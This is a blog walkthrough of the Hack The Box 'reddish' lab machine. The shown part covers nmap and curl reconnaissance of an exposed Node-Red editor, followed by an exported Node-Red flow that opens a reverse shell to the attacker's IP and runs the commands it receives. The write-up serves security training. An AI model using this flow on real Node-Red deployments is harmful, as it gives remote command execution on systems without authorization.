<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="introduceOS:	 LinuxDifficulty:	 InsanePoints:	50Release: 21 Jul 2018IP:	10.10.10.94 User Blood: 00 days, 12 hours, 36 mins, 39 seconds.Root Blood: 00 days, 19 hours, 28 mins, 48 seconds.">
<meta property="og:type" content="article">
<meta property="og:title" content="Hack-The-Box-walkthrough[reddish]">
<meta property="og:url" content="https://fdlucifer.github.io/2020/07/19/reddish/index.html">
<meta property="og:site_name" content="fdvoid0&#39;s blog">
<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	 InsanePoints:	50Release: 21 Jul 2018IP:	10.10.10.94 User Blood: 00 days, 12 hours, 36 mins, 39 seconds.Root Blood: 00 days, 19 hours, 28 mins, 48 seconds.">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb46.jpg">
<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb47.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb48.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb49.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb50.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb51.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb52.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb53.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb54.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb55.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb56.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb57.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb58.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb59.jpg">
<meta property="article:published_time" content="2020-07-19T10:05:14.000Z">
<meta property="article:modified_time" content="2020-08-16T16:58:10.813Z">
<meta property="article:author" content="fdvoid0">
<meta property="article:tag" content="HackTheBox靶机练习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb46.jpg">


<link rel="canonical" href="https://fdlucifer.github.io/2020/07/19/reddish/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/07/19/reddish/","path":"2020/07/19/reddish/","title":"Hack-The-Box-walkthrough[reddish]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hack-The-Box-walkthrough[reddish] | fdvoid0's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="fdvoid0's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">fdvoid0's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by fdvoid0</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">42</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">206</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-gathering"><span class="nav-number">2.</span> <span class="nav-text">information gathering</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Code-Execution-and-getShell-in-Node-Red"><span class="nav-number">3.</span> <span class="nav-text">Code Execution and getShell in Node-Red</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Callback-Shell"><span class="nav-number">4.</span> <span class="nav-text">Callback Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-Upload"><span class="nav-number">5.</span> <span class="nav-text">File Upload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nodered-Container"><span class="nav-number"></span> <span class="nav-text">nodered Container</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Local-Enumeration"><span class="nav-number">1.</span> <span class="nav-text">Local Enumeration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Network-Enumeration"><span class="nav-number">2.</span> <span class="nav-text">Network Enumeration</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pivoting"><span class="nav-number"></span> <span class="nav-text">Pivoting</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-number">1.</span> <span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Getting-Meterpreter"><span class="nav-number">2.</span> <span class="nav-text">Getting Meterpreter</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#www-redis-Containers"><span class="nav-number"></span> <span class="nav-text">www redis Containers</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Note-About-IPs"><span class="nav-number">1.</span> <span class="nav-text">Note About IPs</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap"><span class="nav-number">2.</span> <span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Site"><span class="nav-number">3.</span> <span class="nav-text">Web Site</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Database"><span class="nav-number">4.</span> <span class="nav-text">Database</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WebShell"><span class="nav-number">5.</span> <span class="nav-text">WebShell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Script-Redis-WebShell"><span class="nav-number">6.</span> <span class="nav-text">Script Redis WebShell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Interactive-Shell"><span class="nav-number">7.</span> <span class="nav-text">Interactive Shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privesc-www-data-to-usertxt"><span class="nav-number"></span> <span class="nav-text">Privesc www-data to usertxt</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Identifying-Backup-Cron"><span class="nav-number">1.</span> <span class="nav-text">Identifying Backup Cron</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-Upload-to-www"><span class="nav-number">2.</span> <span class="nav-text">File Upload to www</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#backup-Container"><span class="nav-number"></span> <span class="nav-text">backup Container</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Enumeration"><span class="nav-number">1.</span> <span class="nav-text">Enumeration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rsync-access"><span class="nav-number">2.</span> <span class="nav-text">rsync access</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Shell-via-Cron"><span class="nav-number">3.</span> <span class="nav-text">Shell via Cron</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reddish-Host"><span class="nav-number"></span> <span class="nav-text">reddish Host</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#File-System-Access"><span class="nav-number">1.</span> <span class="nav-text">File System Access</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#root-Shell"><span class="nav-number">2.</span> <span class="nav-text">root Shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Beyond-Root"><span class="nav-number"></span> <span class="nav-text">Beyond Root</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Docker-Configuration"><span class="nav-number">1.</span> <span class="nav-text">Docker Configuration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Node-Red-Collisions"><span class="nav-number">2.</span> <span class="nav-text">Node-Red Collisions</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Creating-Port-Forwards-with-Dropbear"><span class="nav-number"></span> <span class="nav-text">Creating Port Forwards with Dropbear</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Setup"><span class="nav-number">1.</span> <span class="nav-text">Setup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Build-Dropbear"><span class="nav-number">2.</span> <span class="nav-text">Build Dropbear</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-Key-Pair"><span class="nav-number">3.</span> <span class="nav-text">Generate Key Pair</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-Tunnel"><span class="nav-number">4.</span> <span class="nav-text">Create Tunnel</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python-auto-pwn-script"><span class="nav-number"></span> <span class="nav-text">python auto-pwn script</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">0.1.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Contact-me"><span class="nav-number">0.2.</span> <span class="nav-text">Contact me</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="fdvoid0"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">fdvoid0</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">206</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/07/19/reddish/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="fdvoid0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fdvoid0's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Hack-The-Box-walkthrough[reddish] | fdvoid0's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Hack-The-Box-walkthrough[reddish]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2020-07-19 18:05:14" itemprop="dateCreated datePublished" datetime="2020-07-19T18:05:14+08:00">2020-07-19</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2020-08-17 00:58:10" itemprop="dateModified" datetime="2020-08-17T00:58:10+08:00">2020-08-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>8.8k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>32 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:	 Linux<br>Difficulty:	 Insane<br>Points:	50<br>Release: 21 Jul 2018<br>IP:	10.10.10.94</p>
<p>User Blood: 00 days, 12 hours, 36 mins, 39 seconds.<br>Root Blood: 00 days, 19 hours, 28 mins, 48 seconds.</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb46.jpg"></p>
</li>
<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
</li>
</ul>
<span id="more"></span>

<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usaul</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># nmap -sV -v -p- 10.10.10.94 --min-rate=10000</span></span><br><span class="line"></span><br><span class="line">PORT      STATE    SERVICE     VERSION</span><br><span class="line">1880/tcp  open     http        Node.js Express framework</span><br><span class="line">8181/tcp  filtered intermapper</span><br><span class="line">33752/tcp filtered unknown</span><br></pre></td></tr></table></figure>

<ul>
<li>NodeRed - port 1880</li>
</ul>
<p>NodeRed is a browser based editor to make flows for IoT devices and other technology to talk togetheri, and it runs on tcp 1880 by default.</p>
<p>send a POST with curl, and get back some json data:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># curl -X POST http://10.10.10.94:1880</span></span><br><span class="line">&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;96752a0580c49f0f90f8977d70fe318c&quot;</span>,<span class="string">&quot;ip&quot;</span>:<span class="string">&quot;::ffff:10.10.14.5&quot;</span>,<span class="string">&quot;path&quot;</span>:<span class="string">&quot;/red/&#123;id&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>this may gave me a new path to try, let’s visit following url:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.94:1880/red/96752a0580c49f0f90f8977d70fe318c</span><br></pre></td></tr></table></figure>
<p>On visiting that path, now in the Node-Red editor:</p>
<p>The editor has items grouped as “input”, “output”, “function”, “social”, “storage”, “analysis”, and “advanced”. Clicking on any given item will load a description of the item in the panel on the right.</p>
<p>Items can be dragged into the center pane, and connected with wires. Once my flow is complete, I’ll hit “Deploy”, and the flow is live. Some inputs also have a button on their left side. That item will generate its output when the button is pressed. For example, this “inject” will output a timestamp when the button is pressed.</p>
<h3 id="Code-Execution-and-getShell-in-Node-Red"><a href="#Code-Execution-and-getShell-in-Node-Red" class="headerlink" title="Code Execution and getShell in Node-Red"></a>Code Execution and getShell in Node-Red</h3><p>In playing around with the editor, built a few useful flows that will help with exploitation of Reddish. Flows show up nicely as images, but can also be imported&#x2F;exported in json. Just go to the menu, import, clipboard, and paste in the json.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb47.jpg"></li>
</ul>
<p>It will initiate the connection when the the flow to output &gt; is sent to stdin of the tcp connection. The TCP connection will come back to me. Then whatever I send back is sent to exec. The output of that is formatted and a prompt is added, and then sent back into the TCP connection, where I’ll receive it. Here’s the export:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;3f7824bc.483a94&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;tab&quot;</span>,<span class="string">&quot;label&quot;</span>:<span class="string">&quot;Shell&quot;</span>,<span class="string">&quot;disabled&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;info&quot;</span>:<span class="string">&quot;&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;9754e73a.fb7f5&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;tcp request&quot;</span>,<span class="string">&quot;z&quot;</span>:<span class="string">&quot;3f7824bc.483a94&quot;</span>,<span class="string">&quot;server&quot;</span>:<span class="string">&quot;10.10.14.9&quot;</span>,<span class="string">&quot;port&quot;</span>:<span class="string">&quot;9001&quot;</span>,<span class="string">&quot;out&quot;</span>:<span class="string">&quot;sit&quot;</span>,<span class="string">&quot;splitc&quot;</span>:<span class="string">&quot; &quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;x&quot;</span>:520,<span class="string">&quot;y&quot;</span>:80,<span class="string">&quot;wires&quot;</span>:[[<span class="string">&quot;df9367ea.2fd12&quot;</span>]]&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;df9367ea.2fd12&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;z&quot;</span>:<span class="string">&quot;3f7824bc.483a94&quot;</span>,<span class="string">&quot;command&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;addpay&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;append&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;useSpawn&quot;</span>:<span class="string">&quot;false&quot;</span>,<span class="string">&quot;timer&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;oldrc&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;x&quot;</span>:170,<span class="string">&quot;y&quot;</span>:240,<span class="string">&quot;wires&quot;</span>:[[<span class="string">&quot;7cd3aeef.1a522&quot;</span>],[<span class="string">&quot;7cd3aeef.1a522&quot;</span>],[]]&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;6a48f346.ccad1c&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;inject&quot;</span>,<span class="string">&quot;z&quot;</span>:<span class="string">&quot;3f7824bc.483a94&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;topic&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;payload&quot;</span>:<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;payloadType&quot;</span>:<span class="string">&quot;str&quot;</span>,<span class="string">&quot;repeat&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;crontab&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;once&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;onceDelay&quot;</span>:0.1,<span class="string">&quot;x&quot;</span>:191.5,<span class="string">&quot;y&quot;</span>:50,<span class="string">&quot;wires&quot;</span>:[[<span class="string">&quot;9754e73a.fb7f5&quot;</span>]]&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;7cd3aeef.1a522&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;template&quot;</span>,<span class="string">&quot;z&quot;</span>:<span class="string">&quot;3f7824bc.483a94&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;results + prompt&quot;</span>,<span class="string">&quot;field&quot;</span>:<span class="string">&quot;payload&quot;</span>,<span class="string">&quot;fieldType&quot;</span>:<span class="string">&quot;msg&quot;</span>,<span class="string">&quot;format&quot;</span>:<span class="string">&quot;handlebars&quot;</span>,<span class="string">&quot;syntax&quot;</span>:<span class="string">&quot;mustache&quot;</span>,<span class="string">&quot;template&quot;</span>:<span class="string">&quot;&#123;&#123;&#123;payload&#125;&#125;&#125;\n&gt; &quot;</span>,<span class="string">&quot;output&quot;</span>:<span class="string">&quot;str&quot;</span>,<span class="string">&quot;x&quot;</span>:440,<span class="string">&quot;y&quot;</span>:240,<span class="string">&quot;wires&quot;</span>:[[<span class="string">&quot;9754e73a.fb7f5&quot;</span>]]&#125;]</span><br></pre></td></tr></table></figure>

